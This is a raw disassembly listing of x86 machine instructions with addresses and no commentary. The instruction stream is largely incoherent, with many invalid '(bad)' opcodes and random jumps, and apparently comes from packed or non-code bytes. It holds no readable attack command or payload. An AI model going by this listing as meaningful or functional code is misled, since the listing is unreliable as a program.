  40c6a8:	pop    esi
  40c6a9:	inc    ebx
  40c6aa:	je     0x40c667
  40c6ac:	shl    DWORD PTR [ecx+0x2],0xe9
  40c6b0:	dec    esi
  40c6b1:	(bad)  
  40c6b2:	scas   al,BYTE PTR es:[edi]
  40c6b3:	imul   esp,DWORD PTR [edi],0x4e3a027d
  40c6b9:	or     edi,edx
  40c6bb:	imul   esp,DWORD PTR [edi],0xd53f0269
  40c6c1:	jae    0x40c6da
  40c6c3:	in     eax,dx
  40c6c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6c5:	loope  0x40c6d1
  40c6c7:	shl    esp,0x2c
  40c6ca:	add    ebp,ecx
  40c6cc:	js     0x40c718
  40c6ce:	xchg   DWORD PTR [esi-0x572b86d1],ebx
  40c6d4:	cdq    
  40c6d5:	xchg   edx,eax
  40c6d6:	lea    ebp,[ebx]
  40c6d8:	clc    
  40c6d9:	test   al,0x2a
  40c6db:	jno    0x40c6e1
  40c6dd:	jne    0x40c6e1
  40c6df:	xchg   ecx,eax
  40c6e0:	sbb    ch,BYTE PTR [edi]
  40c6e2:	mov    eax,ds:0xb9ff4e7d
  40c6e7:	and    BYTE PTR [edx+0x2d],0x3
  40c6eb:	jmp    0x40c769
  40c6f0:	add    BYTE PTR [eax],al
  40c6f2:	aaa    
  40c6f3:	lods   eax,DWORD PTR ds:[esi]
  40c6f4:	neg    BYTE PTR [ecx]
  40c6f6:	jne    0x40c722
  40c6f8:	add    DWORD PTR [esi*2+0x1ac41a02],0xfba55332
  40c703:	aas    
  40c704:	mov    ds:0xe909b746,al
  40c709:	dec    esi
  40c70a:	(bad)  
  40c70b:	lods   eax,DWORD PTR ds:[esi]
  40c70c:	xchg   edi,eax
  40c70d:	push   edx
  40c70e:	dec    ebx
  40c70f:	(bad)  
  40c710:	mov    ds:0x802a2aa7,eax
  40c715:	add    al,0x75
  40c717:	add    dl,BYTE PTR [ecx]
  40c719:	xor    al,0xce
  40c71b:	mov    al,ds:0x86ba7915
  40c720:	pop    ds
  40c721:	xor    BYTE PTR [ecx-0x73],bl
  40c724:	stos   DWORD PTR es:[edi],eax
  40c725:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c726:	sbb    al,0xf9
  40c728:	mov    ecx,0xff9948d1
  40c72d:	(bad)  
  40c72e:	and    esi,DWORD PTR [ebx+0x158fdf74]
  40c734:	cld    
  40c735:	pop    ebx
  40c736:	mov    cs,WORD PTR [ebx+0x30ff154]
  40c73c:	mov    ebp,DWORD PTR [eax-0x3eaef723]
  40c742:	inc    eax
  40c743:	retf   
  40c744:	add    cl,ch
  40c746:	gs pusha 
  40c748:	pop    ebp
  40c749:	mov    al,0x34
  40c74b:	add    al,0x0
  40c74d:	sbb    ah,dh
  40c74f:	sbb    esp,DWORD PTR [ecx+eiz*8]
  40c752:	jbe    0x40c787
  40c754:	push   esi
  40c755:	add    BYTE PTR ds:[eax],al
  40c758:	add    BYTE PTR [eax],al
  40c75a:	add    BYTE PTR [ebp-0x65567b28],al
  40c760:	aam    0x6a
  40c762:	test   eax,0x36f78b71
  40c767:	adc    BYTE PTR [esp],dl
  40c76a:	loope  0x40c77a
  40c76c:	jns    0x40c736
  40c76e:	call   0x6d3052e9
  40c773:	rcl    BYTE PTR [esi],1
  40c775:	add    al,0xbb
  40c777:	lods   eax,DWORD PTR ss:[esi]
  40c779:	es mov edi,0xe8ff796e
  40c77f:	jbe    0x40c70c
  40c781:	mov    BYTE PTR [ecx+0x24],0x9b
  40c785:	dec    BYTE PTR [esi-0x58]
  40c788:	mov    edi,ss
  40c78a:	push   ecx
  40c78b:	in     al,dx
  40c78c:	retf   0xe900
  40c78f:	ins    BYTE PTR es:[edi],dx
  40c790:	(bad)  
  40c791:	jmp    0x7650:0x68027ce7
  40c798:	add    al,BYTE PTR [eax]
  40c79a:	fidiv  DWORD PTR [esi+0x1120b7a7]
  40c7a0:	mov    eax,ds:0x392db75e
  40c7a5:	ret    0x76e5
  40c7a8:	xor    eax,0x3488008b
  40c7ad:	push   esi
  40c7ae:	push   edi
  40c7af:	sbb    eax,esp
  40c7b1:	sti    
  40c7b2:	push   eax
  40c7b3:	hlt    
  40c7b4:	mov    esi,edi
  40c7b6:	dec    DWORD PTR [ebx+edi*2+0x639bfad5]
  40c7bd:	mov    eax,esi
  40c7bf:	add    BYTE PTR [eax],al
  40c7c1:	add    BYTE PTR [eax],al
  40c7c3:	add    BYTE PTR [ecx],dl
  40c7c5:	jl     0x40c839
  40c7c7:	and    BYTE PTR [edi],dl
  40c7c9:	dec    ecx
  40c7ca:	cld    
  40c7cb:	mov    ecx,0x5c7
  40c7d0:	outs   dx,DWORD PTR ds:[esi]
  40c7d1:	push   ebp
  40c7d2:	mov    ecx,edi
  40c7d4:	and    edi,DWORD PTR [ebx-0x7d]
  40c7d7:	shl    BYTE PTR [ecx+0x84d38f4],cl
  40c7dd:	clc    
  40c7de:	or     BYTE PTR [ebx+0x1890e89],cl
  40c7e4:	(bad)  
  40c7e5:	int3   
  40c7e6:	jmp    0xafaf49f3
  40c7eb:	enter  0x34d,0x33
  40c7ef:	rcr    BYTE PTR [ebx+0x44],0xc9
  40c7f3:	ret    0x310
  40c7f6:	push   ecx
  40c7f7:	sub    DWORD PTR [eax],0xffffffa7
  40c7fa:	push   es
  40c7fb:	add    BYTE PTR [edi-0x24],bh
  40c7fe:	push   esi
  40c7ff:	je     0x40c856
  40c801:	mov    DWORD PTR [esi-0x40129e8c],edi
  40c807:	fisttp DWORD PTR ds:0xa48b0003
  40c80d:	(bad)  
  40c80f:	je     0x40c791
  40c811:	sahf   
  40c812:	out    0xf6,al
  40c814:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c815:	add    eax,0x899c8b00
  40c81a:	hlt    
  40c81b:	jne    0x40c7ed
  40c81d:	mov    ah,0xbe
  40c81f:	jmp    0x40c7e4
  40c821:	fsub   DWORD PTR [edi-0x66]
  40c824:	fadd   QWORD PTR [edx]
  40c826:	add    BYTE PTR [ebx+0x0],cl
  40c82c:	add    BYTE PTR [ebp-0x10],dh
  40c82f:	stos   DWORD PTR es:[edi],eax
  40c830:	xor    BYTE PTR [edi+ecx*1-0x1f00aa5d],bh
  40c837:	stos   DWORD PTR es:[edi],eax
  40c838:	push   0x8a02a9bd
  40c83d:	mov    dh,0x3
  40c83f:	adc    ch,BYTE PTR [edx+0x75]
  40c842:	cmp    DWORD PTR [edi+edi*8-0x6e],0x9dbfd5a8
  40c84a:	xchg   edi,eax
  40c84b:	fwait
  40c84c:	inc    BYTE PTR [edx+0x1c5b41d7]
  40c852:	imul   eax,DWORD PTR [esi],0x0
  40c855:	enter  0xaf10,0x50
  40c859:	(bad)  
  40c85a:	cmc    
  40c85b:	nop
  40c85c:	inc    esp
  40c85d:	popa   
  40c85e:	cld    
  40c85f:	sub    edx,DWORD PTR [esi-0x17fd548b]
  40c865:	mov    esp,DWORD PTR [ecx-0x5f]
  40c868:	(bad)  
  40c869:	(bad)  
  40c86a:	push   ebx
  40c86b:	xchg   eax,ecx
  40c86d:	leave  
  40c86e:	xchg   edi,eax
  40c86f:	lea    eax,[ecx+edi*1+0x2]
  40c873:	fdiv   QWORD PTR [edx]
  40c875:	inc    edi
  40c876:	out    0x9a,al
  40c878:	cmc    
  40c879:	lock jns 0x40c893
  40c87c:	push   cs
  40c87d:	pop    esp
  40c87e:	sahf   
  40c87f:	sahf   
  40c880:	jno    0x40c8ee
  40c882:	and    BYTE PTR [eax],bh
  40c884:	or     ah,bh
  40c886:	test   eax,0x941ec08d
  40c88b:	xor    ebp,eax
  40c88d:	imul   esp,ebx,0x3
  40c893:	add    BYTE PTR [eax],al
  40c895:	add    BYTE PTR [esi-0x15],al
  40c898:	inc    eax
  40c899:	leave  
  40c89a:	mov    bh,0xaf
  40c89c:	add    dl,BYTE PTR [ebp-0x2]
  40c89f:	dec    edi
  40c8a0:	xor    al,0x51
  40c8a2:	dec    ebx
  40c8a3:	es dec eax
  40c8a5:	cld    
  40c8a6:	inc    ebp
  40c8a7:	shl    DWORD PTR [esi],0xe8
  40c8aa:	retf   
  40c8ab:	add    ah,BYTE PTR [eax]
  40c8ad:	mov    ds:0x883089cb,al
  40c8b2:	lods   eax,DWORD PTR ds:[esi]
  40c8b3:	push   ss
  40c8b4:	cmc    
  40c8b5:	mov    ?,WORD PTR [ecx]
  40c8b7:	sahf   
  40c8b8:	sbb    ch,0x67
  40c8bb:	mov    al,0xa6
  40c8bd:	call   0xdb73:0x181a87a0
  40c8c4:	jnp    0x40c865
  40c8c6:	and    al,0xb
  40c8c8:	bound  edi,QWORD PTR [eax]
  40c8ca:	jge    0x40c857
  40c8cc:	jmp    0x8d32:0xf0a9b58c
  40c8d3:	mov    dh,0xad
  40c8d5:	add    esi,DWORD PTR [ebp-0x2f]
  40c8d8:	test   al,0x42
  40c8da:	cmp    al,0xc0
  40c8dc:	in     al,dx
  40c8dd:	add    eax,eax
  40c8df:	mov    esp,ecx
  40c8e1:	test   DWORD PTR [esi-0x66],edx
  40c8e4:	pop    ss
  40c8e5:	test   ecx,ebx
  40c8e7:	or     ch,cl
  40c8e9:	xor    al,0xab
  40c8eb:	xor    eax,0xc1f1d61d
  40c8f0:	adc    al,0xf2
  40c8f2:	iret   
  40c8f3:	ret    0x8cd2
  40c8f6:	inc    edx
  40c8f7:	xor    eax,0x178e
  40c8fc:	add    BYTE PTR [eax],al
  40c8fe:	add    BYTE PTR [ebp-0x56],bh
  40c901:	(bad)  
  40c903:	jne    0x40c907
  40c905:	jb     0x40c89b
  40c907:	stc    
  40c908:	xchg   ebx,eax
  40c909:	sti    
  40c90a:	pop    es
  40c90b:	addr16 ret 0xe381
  40c90f:	test   al,0x28
  40c911:	int    0x8c
  40c913:	xor    ebp,DWORD PTR [edx-0x62fc644b]
  40c919:	mov    esi,0x5daa228d
  40c91e:	leave  
  40c91f:	jne    0x40c923
  40c921:	jae    0x40c8e8
  40c923:	fisttp WORD PTR [eax]
  40c925:	rol    DWORD PTR [ebx],cl
  40c927:	dec    edi
  40c928:	es add dl,bh
  40c92b:	mov    dh,0xa4
  40c92d:	aas    
  40c92e:	xor    DWORD PTR [esp+ebx*4],edx
  40c931:	pop    esi
  40c932:	(bad)  
  40c933:	mov    DWORD PTR [ecx+0xb8bce4],ecx
  40c939:	add    BYTE PTR [edx-0x10c8485f],bh
  40c93f:	mov    ecx,DWORD PTR [edx]
  40c941:	(bad)  
  40c942:	jg     0x40c9c2
  40c944:	stos   BYTE PTR es:[edi],al
  40c945:	addr16 es jbe 0x40c94b
  40c949:	mov    bh,dl
  40c94b:	out    dx,eax
  40c94c:	ds add al,0x60
  40c94f:	aaa    
  40c950:	or     cl,BYTE PTR [ecx-0x3cc69ab9]
  40c956:	push   ebx
  40c957:	sub    dh,BYTE PTR gs:[eax-0x17fdcfa4]
  40c95e:	mov    ecx,0xfa0001d0
  40c963:	add    BYTE PTR [eax],al
  40c965:	add    BYTE PTR [eax],al
  40c967:	add    BYTE PTR [eax],ah
  40c969:	fxch   st(1)
  40c96b:	xor    eax,0xe17c8140
  40c970:	jo     0x40c98e
  40c972:	xor    eax,0x329e8b60
  40c977:	test   eax,0xe2e446ff
  40c97c:	mov    ebx,0x1ecd7d0a
  40c981:	lock pop es
  40c983:	adc    al,0x2a
  40c985:	aam    0x53
  40c987:	icebp  
  40c988:	ja     0x40c99f
  40c98a:	punpckhdq mm6,QWORD PTR [esi]
  40c98d:	add    bh,BYTE PTR [ebx]
  40c98f:	sub    al,0x69
  40c991:	or     edx,DWORD PTR [ecx+ebp*4+0x66fc4ef9]
  40c998:	(bad)  [ebx]
  40c99a:	inc    eax
  40c99b:	push   edx
  40c99c:	rcl    eax,0xbf
  40c99f:	test   eax,0x41648931
  40c9a4:	stc    
  40c9a5:	dec    esi
  40c9a6:	cld    
  40c9a7:	add    BYTE PTR [ebx],dh
  40c9a9:	mov    ch,0xbe
  40c9ab:	call   0x42073f
  40c9b0:	mov    es,WORD PTR [ebx]
  40c9b2:	add    BYTE PTR [ebx],dh
  40c9b4:	outs   dx,BYTE PTR ds:[esi]
  40c9b5:	mov    eax,0xf3d82452
  40c9ba:	and    cl,BYTE PTR [ebx-0x3dc4f7f3]
  40c9c0:	fcomp  DWORD PTR [ebx-0x703b36cf]
  40c9c6:	jae    0x40c9d4
  40c9c8:	mov    ah,0xcf
  40c9ca:	add    BYTE PTR [eax+eax*1+0x0],dh
  40c9ce:	add    BYTE PTR [eax],al
  40c9d0:	add    BYTE PTR [esi-0x57b3c4c0],ah
  40c9d6:	add    esi,DWORD PTR [edi+eax*1-0x24]
  40c9da:	outs   dx,BYTE PTR ds:[esi]
  40c9db:	jmp    0x40ca10
  40c9dd:	fsub   QWORD PTR [edi+0x4]
  40c9e0:	inc    eax
  40c9e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9e2:	dec    DWORD PTR [edx+0x2c19441]
  40c9e8:	add    bh,dl
  40c9ea:	dec    esi
  40c9eb:	or     al,0x85
  40c9ed:	and    eax,0xa48b07f9
  40c9f2:	push   cs
  40c9f3:	mov    DWORD PTR [eax+0x50],ecx
  40c9f6:	push   0xe6c8b29
  40c9fb:	cmp    ecx,edx
  40c9fd:	outs   dx,BYTE PTR ds:[esi]
  40c9fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9ff:	push   esp
  40ca00:	mov    ebx,DWORD PTR [edx+ecx*1+0x3]
  40ca04:	repnz daa 
  40ca06:	int    0x5c
  40ca08:	jae    0x40ca33
  40ca0a:	mov    DWORD PTR [edi],ecx
  40ca0c:	inc    ecx
  40ca0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca0e:	dec    esi
  40ca0f:	or     al,0x84
  40ca11:	(bad)  
  40ca12:	clc    
  40ca13:	cmc    
  40ca14:	cmp    BYTE PTR ds:0x95410afa,bh
  40ca1a:	dec    esi
  40ca1b:	or     al,0x33
  40ca1d:	pop    esp
  40ca1e:	mov    edi,0xff106081
  40ca23:	mov    al,BYTE PTR [eax+0x75]
  40ca26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca27:	sar    DWORD PTR [edi-0x4e],0xa9
  40ca2b:	push   ss
  40ca2c:	pop    es
  40ca2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca2e:	jmp    0xa9b654df
  40ca33:	add    dl,BYTE PTR [ebx+0x0]
  40ca36:	add    BYTE PTR [eax],al
  40ca38:	add    BYTE PTR [eax],al
  40ca3a:	ficomp DWORD PTR [esi+eiz*8+0x7]
  40ca3e:	shl    BYTE PTR [ebp-0x56caee3a],cl
  40ca44:	mov    edi,edx
  40ca46:	clc    
  40ca47:	aas    
  40ca48:	pop    ds
  40ca49:	add    al,0x87
  40ca4b:	jmp    0x3e8c3efa
  40ca50:	pop    ss
  40ca51:	or     dh,dh
  40ca53:	ret    0x7502
  40ca56:	push   esi
  40ca57:	cs inc ebx
  40ca59:	add    al,BYTE PTR [ebp+0x1]
  40ca5c:	inc    edx
  40ca5d:	(bad)  
  40ca5e:	je     0x40ca09
  40ca60:	mov    eax,DWORD PTR ds:0x241668f0
  40ca66:	es mov esp,0xd9652416
  40ca6c:	sahf   
  40ca6d:	adc    al,0xc1
  40ca6f:	xchg   ecx,eax
  40ca70:	inc    edx
  40ca71:	add    dh,dh
  40ca73:	addr16 push cs
  40ca75:	mov    edx,eax
  40ca77:	lahf   
  40ca78:	test   eax,0x7e8ee2d
  40ca7d:	(bad)  
  40ca7e:	shl    DWORD PTR [ebx+0x66cfe803],0x3
  40ca85:	add    cl,bh
  40ca87:	imul   edx,DWORD PTR [edi],0x4
  40ca8a:	xchg   DWORD PTR [ebx-0x57],ebp
  40ca8d:	xor    edi,esi
  40ca8f:	mov    ecx,0xac714e9d
  40ca94:	dec    ebp
  40ca95:	add    al,0xc6
  40ca97:	sbb    BYTE PTR [edi],dl
  40ca99:	and    al,0x85
  40ca9b:	cli    
  40ca9c:	sahf   
  40ca9d:	adc    al,0x0
  40ca9f:	add    BYTE PTR [eax],al
  40caa1:	add    BYTE PTR [eax],al
  40caa3:	shl    DWORD PTR [ecx+0x2f60042],0x2d
  40caaa:	pcmpeqb mm7,QWORD PTR [ecx]
  40caad:	in     eax,0x8a
  40caaf:	mov    bl,0xfe
  40cab1:	popa   
  40cab2:	or     eax,0x3e0febb
  40cab7:	jmp    0x71fe:0x3b8aed41
  40cabe:	or     eax,0x3e0feb3
  40cac3:	rol    BYTE PTR [ecx-0x1b],cl
  40cac6:	push   ebx
  40cac7:	jne    0x40cb01
  40cac9:	ret    0x76c1
  40cacc:	add    dh,BYTE PTR [edx+ecx*4+0x3d582ce]
  40cad3:	sub    esi,edi
  40cad5:	fcmovb st,st(3)
  40cad7:	lahf   
  40cad8:	and    ebx,DWORD PTR [edi+0x720a299e]
  40cade:	into   
  40cadf:	xchg   edx,eax
  40cae0:	mov    ds:0x8d939df6,al
  40cae5:	clc    
  40cae6:	mov    eax,DWORD PTR [ecx]
  40cae8:	or     ch,BYTE PTR [esi+edx*4+0x9]
  40caec:	(bad)  
  40caed:	sbb    al,ah
  40caef:	(bad)
  40caf3:	jb     0x40cae4
  40caf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40caf6:	repnz stos BYTE PTR es:[edi],al
  40caf8:	add    dh,BYTE PTR [edx+0x4d]
  40cafb:	jns    0x40ca84
  40cafd:	and    BYTE PTR [ebx],al
  40caff:	call   0x3b29c501
  40cb04:	xchg   DWORD PTR ds:0xc,esi
  40cb0a:	add    BYTE PTR [eax],al
  40cb0c:	jbe    0x40cb16
  40cb0e:	cmp    BYTE PTR [edx+eax*2],dh
  40cb11:	psllw  mm3,QWORD PTR [ecx+eiz*2+0x7543ff46]
  40cb19:	jmp    0x40cb48
  40cb1b:	or     dh,bh
  40cb1d:	dec    eax
  40cb1e:	in     eax,dx
  40cb1f:	xor    BYTE PTR [esi],0x6
  40cb22:	and    al,BYTE PTR [ecx-0x3fffce3]
  40cb28:	sbb    DWORD PTR [ecx-0x41747ecb],0xdef5e900
  40cb32:	call   FWORD PTR [ebp-0x58]
  40cb35:	(bad)  
  40cb36:	jmp    0x76e8:0xc3c81eec
  40cb3d:	push   edx
  40cb3e:	add    BYTE PTR [edi-0x16fc3b5d],ah
  40cb44:	mov    ds:0x8898eb8d,eax
  40cb49:	(bad)  
  40cb4a:	out    dx,eax
  40cb4b:	pop    esp
  40cb4c:	xor    dl,BYTE PTR [esi+0x48cbf4f]
  40cb52:	(bad)  
  40cb53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb54:	fiadd  DWORD PTR [ecx+eax*1]
  40cb57:	jmp    0x395564d2
  40cb5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb5d:	fdivr  st,st(7)
  40cb5f:	ins    BYTE PTR es:[edi],dx
  40cb60:	mov    ecx,0x32723214
  40cb65:	xchg   esi,eax
  40cb66:	test   BYTE PTR [ecx],ch
  40cb68:	ins    DWORD PTR es:[edi],dx
  40cb69:	in     eax,dx
  40cb6a:	xor    ah,BYTE PTR [eax]
  40cb6c:	push   ebx
  40cb6d:	mov    ecx,DWORD PTR [ebx]
  40cb6f:	das    
  40cb70:	add    BYTE PTR [eax],al
  40cb72:	add    BYTE PTR [eax],al
  40cb74:	add    ah,ch
  40cb76:	mov    esi,0xe6b2065
  40cb7b:	es out 0xc9,al
  40cb7e:	inc    DWORD PTR [edx+0x51459d0]
  40cb84:	push   0xffffffff
  40cb86:	cmp    esi,DWORD PTR [ebp-0x19]
  40cb89:	mov    WORD PTR [esi],ss
  40cb8b:	pop    ecx
  40cb8c:	dec    edi
  40cb8d:	(bad)  
  40cb8e:	inc    DWORD PTR [edx-0x7cdf8b57]
  40cb94:	loope  0x40cc0c
  40cb96:	or     eax,0x2c6e92e4
  40cb9b:	js     0x40cbce
  40cb9d:	loope  0x40cbb7
  40cb9f:	dec    ebx
  40cba0:	call   0x10a041b
  40cba5:	iret   
  40cba6:	ror    BYTE PTR [edx-0x9a07014],1
  40cbac:	cmp    eax,0x1c0002ef
  40cbb2:	rcl    DWORD PTR [ebp+0x57],cl
  40cbb5:	pop    edi
  40cbb6:	pop    ecx
  40cbb7:	data16 cld 
  40cbb9:	pop    ds
  40cbba:	inc    esp
  40cbbb:	add    BYTE PTR [ebx+0x54],dl
  40cbbe:	xlat   BYTE PTR ds:[ebx]
  40cbbf:	and    edx,DWORD PTR [edi]
  40cbc1:	cmp    edx,DWORD PTR [eax+0x40c109a]
  40cbc7:	mov    DWORD PTR [eax+esi*2-0x72],eax
  40cbcb:	cmp    ebx,eax
  40cbcd:	fstp   TBYTE PTR [edi+0x41]
  40cbd0:	add    esp,ebx
  40cbd2:	add    ecx,DWORD PTR [ebx+0x3e933c35]
  40cbd8:	add    BYTE PTR [eax],al
  40cbda:	add    BYTE PTR [eax],al
  40cbdc:	add    BYTE PTR [eax],al
  40cbde:	call   ebx
  40cbe0:	xor    bh,bh
  40cbe2:	mov    ecx,DWORD PTR [ebp+0x39]
  40cbe5:	ret    
  40cbe6:	add    BYTE PTR [esi+ecx*2+0x129f20ff],dl
  40cbed:	inc    edi
  40cbee:	fwait
  40cbef:	dec    esi
  40cbf0:	cmp    ebx,eax
  40cbf2:	adc    DWORD PTR [edi+0x39],ebp
  40cbf5:	sti    
  40cbf6:	add    DWORD PTR [ecx],ecx
  40cbf8:	mov    BYTE PTR [eax+esi*2+0xb],0x1
  40cbfd:	jmp    0x40ca8c
  40cc02:	mov    dh,0xf1
  40cc04:	mov    WORD PTR [eax+esi*2-0x62],?
  40cc08:	push   esi
  40cc09:	mov    DWORD PTR [eax+0x788916a2],ebx
  40cc0f:	mov    ds:0x482de812,al
  40cc14:	add    DWORD PTR [eax],eax
  40cc16:	mov    dh,0x2
  40cc18:	push   ebx
  40cc19:	mov    edx,DWORD PTR [edx]
  40cc1b:	xchg   DWORD PTR [ebx],esi
  40cc1d:	mov    BYTE PTR [ebx+eax*2],bh
  40cc20:	add    BYTE PTR [eax+0x75],dl
  40cc23:	push   ds
  40cc24:	inc    eax
  40cc25:	and    al,0x55
  40cc27:	fstp   DWORD PTR [edx-0x6636a68d]
  40cc2d:	aad    0xf0
  40cc2f:	push   0xa92e840a
  40cc34:	add    al,BYTE PTR [eax]
  40cc36:	(bad)  
  40cc37:	(bad)  
  40cc39:	adc    edi,DWORD PTR [esi]
  40cc3b:	in     al,dx
  40cc3c:	adc    BYTE PTR [esi+eax*2],al
  40cc3f:	jmp    0x40d0f2
  40cc44:	add    BYTE PTR [eax],al
  40cc46:	add    ch,bl
  40cc48:	enter  0xbe,0x75
  40cc4c:	and    al,BYTE PTR [eax+0x24]
  40cc4f:	jge    0x40cc55
  40cc51:	(bad)  
  40cc52:	push   cs
  40cc53:	icebp  
  40cc54:	push   ss
  40cc55:	add    al,0x0
  40cc57:	jne    0x40cc1c
  40cc59:	(bad)  
  40cc5a:	push   edx
  40cc5b:	clc    
  40cc5c:	pop    esp
  40cc5d:	fisub  WORD PTR [ebx]
  40cc5f:	and    eax,0x9524400e
  40cc64:	pop    ecx
  40cc65:	cdq    
  40cc66:	jae    0x40ccc1
  40cc68:	leave  
  40cc69:	cdq    
  40cc6a:	aad    0xf0
  40cc6c:	call   0xa940507b
  40cc71:	add    al,BYTE PTR [eax]
  40cc73:	or     eax,0x75401595
  40cc78:	sub    al,0xcc
  40cc7a:	(bad)  
  40cc7b:	clc    
  40cc7c:	or     al,0xdf
  40cc7e:	jnp    0x40cc0d
  40cc80:	pop    edx
  40cc81:	ins    DWORD PTR es:[edi],dx
  40cc82:	add    BYTE PTR [ebp+0x14],dh
  40cc85:	ror    DWORD PTR [edi+0x72],0x97
  40cc89:	mov    esi,0x87abb513
  40cc8e:	inc    ebx
  40cc8f:	cdq    
  40cc90:	repz xor edi,edi
  40cc93:	sub    BYTE PTR [ebx-0xc],0x3f
  40cc97:	jne    0x40ccda
  40cc99:	adc    cl,BYTE PTR [ebp+0x57d7ffc1]
  40cc9f:	dec    ebp
  40cca0:	add    esi,DWORD PTR [eax+0x4d]
  40cca3:	je     0x40cca7
  40cca5:	ins    BYTE PTR es:[edi],dx
  40cca6:	jg     0x40ccfe
  40cca8:	sbb    ch,al
  40ccaa:	add    eax,DWORD PTR [eax]
  40ccac:	add    BYTE PTR [eax],al
  40ccae:	add    BYTE PTR [eax],al
  40ccb0:	jne    0x40cc5c
  40ccb2:	inc    ebx
  40ccb3:	cdq    
  40ccb4:	and    edx,DWORD PTR [esi-0x2149ad0b]
  40ccba:	shl    BYTE PTR [ebx],1
  40ccbc:	or     BYTE PTR [ebp+0x2c],0xe0
  40ccc0:	pop    eax
  40ccc1:	xor    bl,dh
  40ccc3:	push   edx
  40ccc4:	mov    dh,0xde
  40ccc6:	push   ds
  40ccc7:	xor    al,0xe8
  40ccc9:	jle    0x40cccf
  40cccb:	xor    dl,0x95
  40ccce:	call   0x4bfc506
  40ccd3:	mov    WORD PTR [ebp+0x2],?
  40ccd6:	jmp    0x98fdbb0e
  40ccdb:	sub    eax,0x57643993
  40cce0:	xchg   esi,eax
  40cce1:	repnz out 0x3,eax
  40cce4:	jne    0x40cc90
  40cce6:	loop   0x40cd3e
  40cce8:	jne    0x40ccec
  40ccea:	push   0xffffffbf
  40ccec:	mov    bh,BYTE PTR [edi+0x28]
  40ccef:	sbb    DWORD PTR [ebp-0x6b],edx
  40ccf2:	xchg   esp,eax
  40ccf3:	fild   WORD PTR [esi+0x269a2d89]
  40ccf9:	(bad)  
  40ccfb:	xor    ebx,DWORD PTR ds:0x75437996
  40cd01:	sub    bl,ch
  40cd03:	stos   DWORD PTR es:[edi],eax
  40cd04:	nop
  40cd05:	fldl2e 
  40cd07:	add    esi,ecx
  40cd09:	ret    0xff54
  40cd0c:	cmp    BYTE PTR [esi],bh
  40cd0e:	or     eax,0xb1d17409
  40cd13:	cdq    
  40cd14:	add    BYTE PTR [eax],al
  40cd16:	add    BYTE PTR [eax],al
  40cd18:	add    dh,ah
  40cd1a:	fsubrp st(0),st
  40cd1c:	stos   DWORD PTR es:[edi],eax
  40cd1d:	sub    eax,0xa603e7c1
  40cd22:	xchg   ebp,eax
  40cd23:	(bad)  
  40cd24:	cmp    al,0x55
  40cd26:	icebp  
  40cd27:	(bad)  
  40cd28:	aam    0xbe
  40cd2a:	add    eax,0x40e8e940
  40cd2f:	and    al,0xee
  40cd31:	ins    DWORD PTR es:[edi],dx
  40cd32:	xor    al,0x5b
  40cd34:	bound  ecx,QWORD PTR [edx]
  40cd36:	ss ret 
  40cd38:	xor    al,0xf0
  40cd3a:	test   al,0x82
  40cd3c:	(bad)  
  40cd3d:	stc    
  40cd3e:	sub    ebx,0x27b7d
  40cd44:	sbb    al,BYTE PTR [edi-0x77]
  40cd47:	je     0x40cd2a
  40cd49:	inc    ebp
  40cd4a:	xchg   ebp,eax
  40cd4b:	je     0x40cd46
  40cd4d:	fisttp QWORD PTR ds:0xee0db70c
  40cd53:	xchg   ebx,eax
  40cd54:	stc    
  40cd55:	add    cl,BYTE PTR ss:[ecx-0x7afb3d5b]
  40cd5c:	sub    DWORD PTR [esi+edi*2+0x10],ebp
  40cd60:	call   0xad37cfdb
  40cd65:	(bad)  
  40cd66:	xchg   esp,eax
  40cd67:	(bad)  
  40cd68:	jmp    0xedc5d133
  40cd6d:	ja     0x40cd71
  40cd6f:	add    BYTE PTR [edi+eax*1+0x4],ah
  40cd73:	test   BYTE PTR ds:0x6a000271,dl
  40cd79:	mov    edi,0x6f0d94
  40cd7e:	add    BYTE PTR [eax],al
  40cd80:	add    BYTE PTR [eax],al
  40cd82:	add    BYTE PTR [ebp+0x16f9e9fe],dl
  40cd88:	add    al,0xe9
  40cd8a:	jge    0x40ce0a
  40cd8c:	call   0xe843447a
  40cd91:	jb     0x40cd26
  40cd93:	add    al,BYTE PTR [eax]
  40cd95:	gs ss add eax,0x276b584
  40cd9c:	add    BYTE PTR [edx+eiz*4-0x22],bl
  40cda0:	pop    ds
  40cda1:	add    BYTE PTR [ecx+edi*2+0x13],bh
  40cda5:	shr    BYTE PTR [esi],0x40
  40cda8:	add    BYTE PTR [edx-0x76],ch
  40cdab:	jnp    0x40cd5f
  40cdad:	and    al,0x18
  40cdaf:	add    BYTE PTR [eax],al
  40cdb1:	add    BYTE PTR [esi+eiz*2+0x1d4985],dh
  40cdb8:	push   0x77
  40cdba:	xchg   ecx,eax
  40cdbb:	add    esp,DWORD PTR [esp+esi*1]
  40cdbe:	fs data16 jns 0x40ce0b
  40cdc2:	or     eax,0x38848d00
  40cdc7:	add    BYTE PTR [ecx],al
  40cdc9:	add    BYTE PTR [eax+ebp*2],bl
  40cdcc:	xchg   ebp,eax
  40cdcd:	std    
  40cdce:	xchg   ebx,eax
  40cdcf:	jp     0x40cdde
  40cdd1:	mov    bh,0xc8
  40cdd3:	mov    bl,0x1e
  40cdd5:	push   eax
  40cdd6:	jecxz  0x40ce0a
  40cdd8:	inc    ebx
  40cdd9:	and    al,0x7a
  40cddb:	into   
  40cddc:	push   cs
  40cddd:	mov    bh,0x18
  40cddf:	mov    ah,0x2c
  40cde1:	push   eax
  40cde2:	ror    DWORD PTR [bp-0x73],0x0
  40cde7:	add    BYTE PTR [eax],al
  40cde9:	add    BYTE PTR [eax],al
  40cdeb:	pop    eax
  40cdec:	mov    bl,0xe
  40cdee:	add    esp,ebx
  40cdf0:	dec    DWORD PTR [edi-0x73]
  40cdf3:	pop    eax
  40cdf4:	mov    bl,0xd2
  40cdf6:	add    ah,cl
  40cdf8:	dec    DWORD PTR [edi+0x6a]
